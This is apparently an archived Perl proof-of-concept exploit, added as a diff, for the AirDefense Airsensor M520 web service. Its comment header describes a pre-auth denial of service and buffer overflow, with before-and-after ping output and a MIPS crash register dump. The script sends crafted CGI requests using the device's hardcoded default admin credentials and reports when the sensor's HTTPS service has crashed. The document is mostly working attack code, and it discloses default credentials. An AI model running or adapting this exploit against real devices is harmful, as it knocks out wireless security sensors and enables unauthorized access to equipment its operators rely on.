@@ -1,0 +1,156 @@
+#!/usr/bin/perl -w
+#									
+# Airsensor M520 HTTPD Remote Preauth Denial Of Service and Buffer Overflow PoC		
+#									
+# The vulnerability is caused due to an unspecified error in the cgis	
+# files filter used for configure propierties. This can be exploited by	
+# sending a specially crafted HTTPS request (necessary authentication), 
+# which will cause the HTTPS service on the system to crash.		
+#									
+# Requisites: "Use DHCP" option interface mark "No"		
+#									
+# Examples:								
+# 									
+# GET https://192.168.100.100/adLog.cgi?%41%41%41 HTTP/1.1		
+# GET https://192.168.100.100/post.cgi?%41%41%41 HTTP/1.1		
+# GET https://192.168.100.100/ad.cgi?%41%41%41 HTTP/1.1			
+# 									
+# Pinging:								
+#									
+# Before:								
+#									
+# Reply from 192.168.100.100: bytes=32 time<1ms TTL=64			
+# Reply from 192.168.100.100: bytes=32 time<1ms TTL=64			
+# Reply from 192.168.100.100: bytes=32 time<1ms TTL=64			
+#									
+# After:								
+#									
+# Hardware error.							
+# Hardware error.							
+# Hardware error.							
+# Request timed out.							
+# Request timed out.							
+# Request timed out.							
+#									
+# C:\>nc -vvn 192.168.100.100 443					
+# (UNKNOWN) [192.168.100.100] 443 (?): connection refused		
+# sent 0, rcvd 0: NOTSOCK						
+#
+# Buffer Overflow debug log:
+#
+# 1970-01-01 00:00:15   SYS-INFO:: AirDefense Firmware Version 4.4.1.4, Model = M520
+# 1970-01-01 00:00:15   SYS-CRIT:: SENSOR EXCEPTION ERROR
+# 1970-01-01 00:00:15   SYS-CRIT:: SENSOR VERSION NUMBER: 4.4.1.4
+# 1970-01-01 00:00:15   SYS-CRIT:: SENSOR Up Time:  00:08:51
+# 1970-01-01 00:00:15   SYS-CRIT:: Time of Exception: 1970-01-01 00:08:55
+# 1970-01-01 00:00:15   SYS-CRIT:: Exception ID = 10 ( Reserved Instruction)
+# 1970-01-01 00:00:15   SYS-CRIT:: Thread = HTTPD
+# 1970-01-01 00:00:15   SYS-CRIT:: MIPS Register Dump:
+# 1970-01-01 00:00:15   SYS-CRIT::  zero=0x00000000    at=0xfffffffe    v0=0x00000000    v1=0x00000000
+# 1970-01-01 00:00:16   SYS-CRIT::    a0=0x00000000    a1=0x3d000000    a2=0x00000010    a3=0x00000041
+# 1970-01-01 00:00:16   SYS-CRIT::    t0=0x00000000    t1=0x0000003d    t2=0x0000000b    t3=0x00000000
+# 1970-01-01 00:00:16   SYS-CRIT::    t4=0x802f799c    t5=0xf43dd40f    t6=0x0066a1a4    t7=0x4df0e494
+# 1970-01-01 00:00:16   SYS-CRIT::    s0=0x802f7dbf    s1=0x0000001f    s2=0x802f7910    s3=0x80120000
+# 1970-01-01 00:00:16   SYS-CRIT::    s4=0x80120000    s5=0x80986c30    s6=0x80120000    s7=0x80128afc
+# 1970-01-01 00:00:16   SYS-CRIT::    t8=0x480ec8cd    t9=0x742b7136    k0=0x802f78c8    k1=0x802f7910
+# 1970-01-01 00:00:16   SYS-CRIT::    gp=0x8015b070    sp=0x802f7910    fp=0x80128aec    ra=0x800b2534
+# 1970-01-01 00:00:16   SYS-CRIT:: Address of instruction that caused exception = 0x800b2534
+# 1970-01-01 00:00:16   SYS-CRIT:: Memory address at which adress exception occured = 0x00000000
+# 1970-01-01 00:00:16   SYS-CRIT:: Return address = 0x800b2534
+# 1970-01-01 00:00:17   SYS-CRIT:: Status Reg = 0x1000af03
+# 1970-01-01 00:00:17   SYS-CRIT:: Cache Reg = 0x00000000
+# 1970-01-01 00:00:17   SYS-CRIT:: Cause Reg = 0x30000028
+# 1970-01-01 00:00:17   SYS-CRIT:: Config Reg = 0x03fffbfb
+# 1970-01-01 00:00:17   SYS-CRIT:: Vector = 40
+# 1970-01-01 00:00:17   SYS-CRIT:: Processor Version = 0x00018009
+# 1970-01-01 00:00:17   SYS-CRIT:: Stack Trace Begin: "->" = return address
+# 1970-01-01 00:00:17   SYS-CRIT::   [802f7910]=0x802f7dbf
+# 1970-01-01 00:00:17   SYS-CRIT::   [802f7914]=0x00000000
+# 1970-01-01 00:00:17   SYS-CRIT::   [802f7918]=0x00000000
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f7990]=0x80130000
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f7994]=0x802f7db4
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f7998]=0x80152e18
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f799c]=0x80152ed8
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f79a0]=0x802f7dbf
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f79a4]=0x80986c30
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f79a8]=0x802f8200
+# 1970-01-01 00:00:19   SYS-CRIT:: ->[802f79ac]=0x800f0450	<- return address
+# 1970-01-01 00:00:19   SYS-CRIT::   [802f79b0]=0x0d0a0074
+# 1970-01-01 00:00:21   SYS-CRIT:: Stack Trace End:
+#									
+# The vulnerability has been reported in versions Airdefense		
+#
+# Firmware Version 4.3.1.1, Model = M520
+# Firmware version 4.4.1.4, Model = M520				
+# 
+# More information: 	http://www.airdefense.net
+#			http://support.airdefense.net
+#
+# Very special credits: str0ke, Kf, rathaous, !dsr, 0dd.
+#				
+# and friends: nitr0us, crypkey, dex, xdawn, sirdarckcat, kuza55, 
+# pikah, codebreak, h3llfyr3
+#					
+# Alex Hernandez ahernandez [at] sybsecurity dot com
+#
+
+use strict;
+use LWP;
+use Data::Dumper;
+require HTTP::Request;
+require HTTP::Headers;
+
+my $string = 	"%41%41%41";			# Strings to send
+my $method = 	'GET';				# Method "GET" or "POST"
+my $uri = 	'https://192.168.100.100';	# Factory default IP address 
+my $content = 	"/adLog.cgi?";			# Cgi's file to crash
+
+#my $content = 	"/ad.cgi?";
+#my $content = 	"/post.cgi?";
+#my $content = 	"/logout.cgi?";
+
+my $headers = HTTP::Headers->new(
+
+'Host:'                	=> '192.168.100.100',
+'User-Agent:'          	=> 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6',
+'Accept:'              	=> 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+'Accept-Language:'     	=> 'en-us,en;q=0.5',
+'Accept-Charset:'   	=> 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',     
+'Keep-Alive:'          	=> '300',
+'Connection:'          	=> 'keep-alive',
+'Referer:'       	=> 'https://192.168.100.100/adLog.cgi?submitButton=refresh&refresh=Refresh',
+'Authorization:'	=> 'Basic YWRtaW46YWlyc2Vuc29y', # base64 encode admin:airsensor
+
+);
+
+my $request = HTTP::Request->new($method, $uri, $headers, $content, $string);
+
+my $ua = LWP::UserAgent->new;
+my $response = $ua->request($request);
+
+print "[+] Denial of Service exploit for Airsensor M520 Final\n";
+print "[+] Coded by: Alex Hernandez [ahernandez\@sybsecurity.com]\n";
+print "[+] We got this response from sensor: \n\n" . $response->content . "\n";
+
+my $data;
+	foreach my $pair (split('&', $response->content)) {
+ 		my ($k, $v) = split('=', $pair);
+ 		$data->{$k} = $v;
+}
+
+if ($data->{RESULT} != 0) {
+
+	print "[+] Denial of Service exploit for Airsensor M520 Final\n";
+	print "[+] Coded by: Alex Hernandez[ahernandez\@sybsecurity.com]\n";
+	print "[+] Use:\n";
+	print "\tperl -x dos_sensor.pl\n";
+ 	print $data->{RESPMSG} . "\n";
+	exit(0);
+
+} else {
+
+ 	print "[+] Denial of service Exploit successed!!!\n";
+	print "[+] By Alex Hernandez[ahernandez\@sybsecurity.com]\n";
+}
+
+# milw0rm.com [2007-09-18]
